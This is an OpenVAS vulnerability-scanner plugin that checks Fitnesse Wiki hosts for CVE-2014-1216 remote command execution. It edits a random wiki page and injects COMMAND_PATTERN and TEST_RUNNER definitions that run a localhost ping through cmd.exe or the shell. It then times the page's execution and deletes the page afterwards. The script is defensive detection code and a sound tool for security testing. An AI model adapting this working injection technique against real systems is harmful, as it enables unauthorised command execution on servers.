###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fitnesse_wiki_rce.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# Fitnesse Wiki Remote Command Execution Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802069");
  script_bugtraq_id(65921);
  script_cve_id("CVE-2014-1216");
  script_version("$Revision: 11402 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-03-17 10:20:42 +0530 (Mon, 17 Mar 2014)");
  script_name("Fitnesse Wiki Remote Command Execution Vulnerability");

  script_tag(name:"summary", value:"The host is running Fitnesse Wiki and is prone to remote command execution
  vulnerability.");

  script_tag(name:"vuldetect", value:"Try to execute a command on the remote host");

  script_tag(name:"insight", value:"The flaw is due to not properly validating the syntax of edited pages to
  check whether the pages are introducing any extra parameters that could be
  executed in the context of the application.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary
  commands in the context of the affected application.");

  script_tag(name:"affected", value:"Fitnesse Wiki version 20140201 and earlier.");

  script_tag(name:"solution", value:"No known solution was made available
  for at least one year since the disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/57121");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Mar/1");
  script_xref(name:"URL", value:"https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-1216");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80, 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

function cleanup(host, http_port, fpath)
{

  ## Delete the page
  post_data = string("confirmed=Yes");
  post_data_len = strlen(post_data);
  referer = string("http://", host, fpath, "?deletePage");

  ## Clenup the added code by deleting the page
  fwiki_req3 = 'POST ' + fpath + "?deletePage" + ' HTTP/1.1\r\n' +
               'Host: ' + host + '\r\n' +
               'Content-Type: application/x-www-form-urlencoded\r\n' +
               'Referer: '+ referer + '\r\n' +
               'Content-Length: ' + post_data_len + '\r\n' +
               '\r\n' + post_data;
  fwiki_res3 = http_keepalive_send_recv( port:http_port, data:fwiki_req3, bodyonly:FALSE );
}

http_port = get_http_port(default:80);
host = http_host_name(port:http_port);

foreach dir (make_list_unique("/", "/wiki", "/fitnesse", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  fwiki_res1 = http_get_cache(item:string(dir, "/"), port:http_port);

  if(">FitNesse<" >!< fwiki_res1) {
    continue;
  }

  ## Random Page
  fpath = dir + "/TestP" + rand_str(charset:"abcdefghijklmnopqrstuvwxyz", length:7);

  ## Edit random page for adding the content
  fwiki_req2 = http_get(item:string(fpath,"?edit"), port:http_port);
  fwiki_res2 = http_keepalive_send_recv(port:http_port, data:fwiki_req2);

  ## Extract editTime and ticketId for future request
  edit_time = eregmatch(pattern:'name="editTime" value="([0-9]+)"' , string:fwiki_res2);
  ticket_id = eregmatch(pattern:'name="ticketId" value="(-?[0-9]+)"' , string:fwiki_res2);

  if(isnull(edit_time[1]) || isnull(ticket_id[1])){
    continue;
  }

  sleep = make_list(5, 8);

  ## Use sleep time to check we are able to execute command
  foreach sec (sleep)
  {
    ## i.e cmd.exe  /c "ping -n 11 127.0.0.1>nul" will wait for 10 seconds
    ## and for Linux sleep command i.e sleep 10
    if(host_runs("Windows") == "yes"){
      cmd = '%21define+COMMAND_PATTERN+%7B%25m+%7C%7C+%7D%0D%0A';
      cmd += '%21define+TEST_RUNNER+%7B';
      cmd += 'cmd.exe+/c+"ping+-n+' + (sec+1) + '+127.0.0.1>nul';
      cmd += '%7D%0D%0A';
      wait_extra_sec = 5;
    } else {
      cmd = '%21define+COMMAND_PATTERN+%7B%25m+%7D%0D%0A';
      cmd += '%21define+TEST_RUNNER+%7B';
      cmd += 'ping+-i+0.1+-c+' + sec + '+127.0.0.1';
      cmd += '%7D%0D%0A';
      wait_extra_sec = 7;
    }

    post_data = string("editTime=", edit_time[1], "&ticketId=", ticket_id[1],
                "&responder=saveData&helpText=&suites=&__EDITOR__1=textarea&",
                "pageContent=", cmd, "&save=Save");
    post_data_len = strlen(post_data);
    referer = string("http://", host, fpath, "?edit");

    fwiki_req1 = 'POST ' + fpath + ' HTTP/1.1\r\n' +
                 'Host: ' + host + '\r\n' +
                 'Content-Type: application/x-www-form-urlencoded\r\n' +
                 'Referer: '+ referer + '\r\n' +
                 'Content-Length: ' + post_data_len + '\r\n' +
                 '\r\n' + post_data;
    fwiki_res1 = http_keepalive_send_recv( port:http_port, data:fwiki_req1, bodyonly:FALSE );

    ## Execute added content
    fwiki_req2 = http_get(item:string(fpath,"?test"), port:http_port);

    ## Now check how much time it's taking to execute
    start = unixtime();
    fwiki_res2 = http_keepalive_send_recv(port:http_port, data:fwiki_req2);
    stop = unixtime();

    time_taken = stop - start;

    if(time_taken < sec || time_taken > ( sec+wait_extra_sec ))
    {
      ## Cleanup the added page
      cleanup(host:host, http_port:http_port, fpath:fpath);
      exit(0);
    }
  }

  ## Cleanup the added page
  cleanup(host:host, http_port:http_port, fpath:fpath);
  security_message(port:http_port);
  exit(0);
}

exit(99);
